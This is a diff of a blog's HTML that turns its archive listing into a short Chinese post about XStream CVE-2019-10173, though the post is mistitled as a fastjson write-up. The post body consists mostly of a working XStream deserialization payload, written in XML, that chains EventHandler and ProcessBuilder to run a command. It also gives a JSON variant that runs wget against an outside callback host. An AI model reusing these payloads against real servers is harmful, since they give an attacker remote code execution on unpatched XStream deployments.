@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="xstream,">
 
 
 
@@ -81,17 +81,18 @@
 
 
 
-<meta name="description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">
-<meta name="keywords" content="技术，代码，harking，hack, sec, 网络安全">
-<meta property="og:type" content="website">
-<meta property="og:title" content="少女的泪">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+<meta name="description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload1234567891011121314&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Comp">
+<meta name="keywords" content="xstream">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson的RCE漏洞复现记录">
+<meta property="og:url" content="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/index.html">
 <meta property="og:site_name" content="少女的泪">
-<meta property="og:description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">
+<meta property="og:description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload1234567891011121314&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Comp">
 <meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-25T13:30:44.642Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="少女的泪">
-<meta name="twitter:description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">
+<meta name="twitter:title" content="fastjson的RCE漏洞复现记录">
+<meta name="twitter:description" content="0x00 CVE-2019-10173参考http://x-stream.github.io/changes.html#1.4.11 0x01 payload1234567891011121314&amp;lt;sorted-set&amp;gt;&amp;lt;string&amp;gt;foo&amp;lt;/string&amp;gt;&amp;lt;dynamic-proxy&amp;gt;&amp;lt;interface&amp;gt;java.lang.Comp">
 
 
 
@@ -121,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/">
 
 
 
 
 
-  <title>Archive | 少女的泪</title>
+  <title>fastjson的RCE漏洞复现记录 | 少女的泪</title>
   
 
 
@@ -146,7 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -277,391 +278,172 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/xstream-1.4.10反序列化漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="JOJO">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="少女的泪">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">fastjson的RCE漏洞复现记录</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T02:21:30+08:00">
+                2019-07-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
           
-        
-        Um..! 11 posts in total. Keep on posting.
-      </span>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
 
-      
-
-        
-        
-        
-
-        
+                
+                
+              
+            </span>
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
 
-        
+          
+            
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/25/xstream-1.4.10反序列化漏洞/" itemprop="url">
-              
-                <span itemprop="name">fastjson的RCE漏洞复现记录</span>
-              
-            </a>
-        
-      </h2>
+          
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-25T02:21:30+08:00" content="2019-07-25">
-          07-25
-        </time>
-      </div>
+          
 
-    </header>
-  </article>
+          
 
+        </div>
+      </header>
+    
 
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/07/13/fastjson的RCE漏洞复现记录/" itemprop="url">
-              
-                <span itemprop="name">fastjson的RCE漏洞复现记录</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-13T12:21:30+08:00" content="2019-07-13">
-          07-13
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/06/25/exe4j生成的exe文件反编译记录/" itemprop="url">
-              
-                <span itemprop="name">exe4j生成的exe文件反编译记录</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-25T17:40:30+08:00" content="2019-06-25">
-          06-25
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+      
+        <h2 id="0x00-CVE-2019-10173"><a href="#0x00-CVE-2019-10173" class="headerlink" title="0x00 CVE-2019-10173"></a>0x00 CVE-2019-10173</h2><p>参考<a href="http://x-stream.github.io/changes.html#1.4.11" target="_blank" rel="noopener">http://x-stream.github.io/changes.html#1.4.11</a></p>
+<h2 id="0x01-payload"><a href="#0x01-payload" class="headerlink" title="0x01 payload"></a>0x01 payload</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">"java.beans.EventHandler"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping xxxxx<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可能的变形：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"sorted-set":&#123;"string":"foo","dynamic-proxy":&#123;"interface":"java.lang.Comparable","handler":&#123;"class":"java.beans.EventHandler","target":&#123;"class":"java.lang.ProcessBuilder","command":"wget http://2nmquk.ceye.io"&#125;,"action":"start"&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x02-说明"><a href="#0x02-说明" class="headerlink" title="0x02 说明"></a>0x02 说明</h2><p>XML的payload是没问题的，json这些是改的，不见得可以，不过xstream的反序列化函数确实是支持json和XML同时传入的</p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/06/20/基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735/" itemprop="url">
-              
-                <span itemprop="name">基于VIM宏的后门-深入利用VIM漏洞CVE-2019-12735</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-20T15:40:30+08:00" content="2019-06-20">
-          06-20
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/08/CVE-2019-3396：confluence任意文件读取与RCE漏洞复现/" itemprop="url">
-              
-                <span itemprop="name">CVE-2019-3396：confluence任意文件读取与RCE漏洞复现</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-08T19:20:18+08:00" content="2019-04-08">
-          04-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/08/安卓模拟器相关/" itemprop="url">
-              
-                <span itemprop="name">安卓模拟器相关</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-08T17:43:21+08:00" content="2019-04-08">
-          04-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/03/MITMPROXY的摘要/" itemprop="url">
-              
-                <span itemprop="name">MITMPROXY的摘要</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-03T15:40:30+08:00" content="2019-04-03">
-          04-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/03/bilibili子域名根目录挂黑页问题记录/" itemprop="url">
-              
-                <span itemprop="name">bilibili子域名根目录挂黑页问题记录</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-03T15:40:30+08:00" content="2019-04-03">
-          04-03
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/04/02/小米手环刷公司门禁/" itemprop="url">
-              
-                <span itemprop="name">小米手环刷公司门禁</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-04-02T13:32:55+08:00" content="2019-04-02">
-          04-02
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2019/03/29/关于淘宝二维码钓鱼问题的一些想法/" itemprop="url">
-              
-                <span itemprop="name">关于淘宝二维码问题的一些想法</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-03-29T17:36:45+08:00" content="2019-03-29">
-          03-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xstream/" rel="tag"># xstream</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/13/fastjson的RCE漏洞复现记录/" rel="next" title="fastjson的RCE漏洞复现记录">
+                <i class="fa fa-chevron-left"></i> fastjson的RCE漏洞复现记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -669,6 +451,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -689,8 +475,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -773,6 +568,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-CVE-2019-10173"><span class="nav-number">1.</span> <span class="nav-text">0x00 CVE-2019-10173</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-payload"><span class="nav-number">2.</span> <span class="nav-text">0x01 payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-说明"><span class="nav-number">3.</span> <span class="nav-text">0x02 说明</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -919,6 +730,10 @@
   
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
